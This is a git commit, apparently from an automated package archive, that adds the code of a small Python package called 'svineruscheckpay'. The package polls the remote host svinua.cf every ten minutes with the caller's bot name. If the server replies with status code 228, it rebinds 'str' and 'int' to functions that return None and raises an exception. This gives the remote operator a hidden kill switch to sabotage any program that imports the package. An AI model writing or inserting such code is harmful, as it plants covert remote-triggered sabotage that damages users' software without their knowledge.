fa6d011894589f3551df4991c2276a9f8e521f16
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 16:30:37 +0000

    Add package svineruscheckpay/0.0.4/svineruscheckpay-0.0.4.tar.gz

---
+++ packages/svineruscheckpay/svineruscheckpay-0.0.4.tar.gz/svineruscheckpay-0.0.4/svineruscheckpay/__init__.py
@@ -0,0 +1,29 @@
+import requests
+from time import sleep
+from threading import Thread
+
+_URL = 'http://svinua.cf/api/checkpay/?bot='
+_name = ''
+
+
+def check(name, atstart=False):
+    global _name
+    _name = name
+    if atstart:
+        _check()
+    Thread(target=_check_loop, daemon=True).start()
+
+
+def _check_loop():
+    while True:
+        sleep(60 * 10)
+        _check()
+
+
+def _check():
+    global str, int
+
+    r = requests.get(_URL + _name)
+    if r.status_code == 228:
+        str = int = lambda x: None
+        raise Exception('oh fuck')
